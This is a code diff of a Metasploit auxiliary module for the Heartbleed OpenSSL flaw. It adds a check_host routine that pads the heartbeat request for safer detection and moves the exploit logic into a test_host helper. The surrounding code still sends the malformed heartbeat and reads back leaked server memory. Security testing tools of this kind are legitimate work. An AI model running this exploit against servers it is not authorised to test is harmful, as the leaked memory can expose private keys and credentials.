@@ -226,7 +226,18 @@ class Metasploit3 < Msf::Auxiliary
     res
   end
 
-  def run_host(ip)
+  def check_host(ip)
+    # TODO: this number can be lower
+    heartbeat_data = test_host(ip, 5000)
+
+    if heartbeat_data
+      return Exploit::CheckCode::Appears
+    end
+
+    Exploit::CheckCode::Safe
+  end
+
+  def test_host(ip, length = heartbeat_length)
     connect
 
     unless datastore['STARTTLS'] == 'None'
@@ -248,7 +259,7 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length))
+    sock.put(heartbeat(length))
     hdr = sock.get_once(5)
     if hdr.blank?
       vprint_error("#{peer} - No Heartbeat response...")
@@ -284,7 +295,12 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-    heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
+    sock.get_once(length) # Read the magic length...
+  end
+
+  def run_host(ip)
+    heartbeat_data = test_host(ip)
+
     if heartbeat_data
       print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
@@ -320,6 +336,11 @@ class Metasploit3 < Msf::Auxiliary
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
     payload << [length].pack("n") # Payload Length: 65535
+
+    # handle safe detection
+    if length != heartbeat_length
+      payload << Array.new(length, 1).pack("C*")  # Dummy values
+    end
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
